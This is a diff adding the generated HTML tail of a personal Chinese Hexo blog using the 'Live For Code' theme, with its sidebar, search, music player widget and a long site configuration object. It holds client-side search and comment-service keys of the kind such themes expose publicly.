+                    <a name="微信" href="javascript:;" class="" target="_self" data="/image/sidebar/weixin.png"><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/zhangyuhaimian/zhangyuhaimian.github.io" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <div class="aplayer"></div>
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript">
+            const aplayer = new APlayer({
+                container: document.querySelector(".aplayer"),
+                fixed: true,
+                autoplay: true,
+                loop: "all",
+                order: "random",
+                preload: "auto",
+                volume: 0.67,
+                mutex: true,
+                lrcType: 3,
+                audio: [
+                    
+                        {
+                            name: "知我",
+                            artist: "剑来",
+                            cover: "/music/cover/preview.jpg",
+                            url: "/music/song/知我.mp3",
+                            lrc: "/music/lrc/Endless Tears.lrc"
+                        },
+                    
+                ]
+            });
+        </script>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "zhangyuhaimian",
+        GitHubRepositories : "zhangyuhaimian",
+
+        User             : "章鱼海绵",
+        UserAvatar       : "/image/sidebar/touxiang.jpg",
+        WebsiteStartDate : "2023-02-10",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.jpg",
+            
+        ],
+        HomeBannerText  : "遇事不决，可问春风，春风不语，便随本心",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "遇事不决，可问春风",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : "/image/sidebar/weixin.png"
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/zhangyuhaimian/zhangyuhaimian.github.io",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/wechat.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "APlayer"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : true,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "知我",
+                        artist : "剑来",
+                        cover  : "/music/cover/preview.jpg",
+                        url    : "/music/song/知我.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : true, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : false
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
